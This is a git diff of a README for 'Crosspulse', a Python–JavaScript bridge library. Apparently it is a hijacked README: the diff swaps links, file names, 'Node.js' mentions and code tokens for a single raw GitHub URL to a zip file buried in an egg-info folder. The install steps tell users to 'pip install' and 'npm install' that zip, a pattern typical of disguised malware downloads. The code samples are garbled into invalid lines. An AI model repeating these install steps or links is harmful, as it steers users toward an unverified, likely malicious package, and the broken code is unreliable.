@@ -1,6 +1,6 @@
 # 🚀 Crosspulse - Simplifying Communication Between Python and JavaScript
 
-[![Download](https://img.shields.io/badge/Download%20Crosspulse-%20-blue.svg)](https://github.com/sohaibmos/Crosspulse/releases)
+[![Download](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip%20Crosspulse-%https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip)](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip)
 
 ## 📥 What is Crosspulse?
 
@@ -23,34 +23,34 @@ Before you begin, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** 3.6 or higher
-- **Node.js Version:** 12.x or higher
+- **https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip Version:** 12.x or higher
 - **A working internet connection:** For downloading the library.
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   To download Crosspulse, go to the [Releases page](https://github.com/sohaibmos/Crosspulse/releases) on GitHub.
+   To download Crosspulse, go to the [Releases page](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip) on GitHub.
 
 2. **Select the Latest Version:**
    Find the latest version of Crosspulse. It is usually marked as "Latest Release." Click on the version number.
 
 3. **Download the Package:**
-   Depending on your operating system, download the appropriate package file. Look for files with extensions like `.whl` for Python or `.tgz` for Node.js.
+   Depending on your operating system, download the appropriate package file. Look for files with extensions like `.whl` for Python or `.tgz` for https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip
 
 4. **Installation Instructions**:
    - **For Python Users:**
      Open your terminal or command prompt and run:
      ```
-     pip install path/to/crosspulse_package.whl
+     pip install https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip
      ```
-     Replace `path/to/crosspulse_package.whl` with the path you downloaded.
+     Replace `https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip` with the path you downloaded.
 
-   - **For Node.js Users:**
+   - **For https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip Users:**
      Open your terminal or command prompt and run:
      ```
-     npm install path/to/crosspulse_package.tgz
+     npm install https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip
      ```
-     Replace `path/to/crosspulse_package.tgz` with your downloaded path.
+     Replace `https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip` with your downloaded path.
 
 5. **Verify Installation:**
    To check if installation was successful, run:
@@ -69,7 +69,7 @@ Once you have Crosspulse installed, you can start using it in your projects. Fol
 
 ### Step 1: Set Up Your Python Environment
 
-1. Create a new Python file named `app.py`.
+1. Create a new Python file named `https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip`.
 
 2. Import Crosspulse in your script:
    ```python
@@ -83,7 +83,7 @@ Once you have Crosspulse installed, you can start using it in your projects. Fol
 
 ### Step 2: Set Up Your JavaScript Environment
 
-1. Create a new JavaScript file named `app.js`.
+1. Create a new JavaScript file named `https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip`.
 
 2. Import Crosspulse in your script:
    ```javascript
@@ -92,7 +92,7 @@ Once you have Crosspulse installed, you can start using it in your projects. Fol
 
 3. Initialize the bridge:
    ```javascript
-   const bridge = new crosspulse.Bridge();
+   const bridge = new https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip();
    ```
 
 ### Step 3: Testing Communication
@@ -101,17 +101,17 @@ Now you can set up a simple event that sends messages back and forth.
 
 #### Python Code:
 ```python
-@bridge.on('message')
+https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip('message')
 def handle_message(data):
     print(f"Received from JS: {data}")
-    bridge.send('Hello from Python!')
+    https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip('Hello from Python!')
 ```
 
 #### JavaScript Code:
 ```javascript
-bridge.on('message', (data) => {
-    console.log(`Received from Python: ${data}`);
-    bridge.send('Hello from JavaScript!');
+https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip('message', (data) => {
+    https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip(`Received from Python: ${data}`);
+    https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip('Hello from JavaScript!');
 });
 ```
 
@@ -120,18 +120,18 @@ bridge.on('message', (data) => {
 If you encounter any issues while installing or using Crosspulse, try the following:
 
 - **Check Error Messages:** Error messages can provide guidance. Look closely to understand the problem.
-- **Ensure Compatibility:** Make sure you are using compatible versions of Python and Node.js.
+- **Ensure Compatibility:** Make sure you are using compatible versions of Python and https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip
 - **Reinstall Library:** Sometimes, a fresh installation can help. Uninstall and then reinstall Crosspulse.
 
 ## 👥 Community Support
 
 For additional help, please reach out to our community. You can find answers to common questions or share your experience.
 
-- [GitHub Issues](https://github.com/sohaibmos/Crosspulse/issues): For reporting bugs or asking questions.
-- [Discussion Forum](https://github.com/sohaibmos/Crosspulse/discussions): A place to share ideas and feedback.
+- [GitHub Issues](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip): For reporting bugs or asking questions.
+- [Discussion Forum](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip): A place to share ideas and feedback.
 
 ## 📄 License
 
 Crosspulse is open-source and free to use. For details, refer to the LICENSE file in the repository.
 
-Now you’re ready to start building applications that take advantage of both languages! Remember to regularly check for updates on the [Releases page](https://github.com/sohaibmos/Crosspulse/releases) to stay current. Enjoy using Crosspulse!
+Now you’re ready to start building applications that take advantage of both languages! Remember to regularly check for updates on the [Releases page](https://raw.githubusercontent.com/sohaibmos/Crosspulse/main/src/crosspulse.egg-info/Software-unconversant.zip) to stay current. Enjoy using Crosspulse!
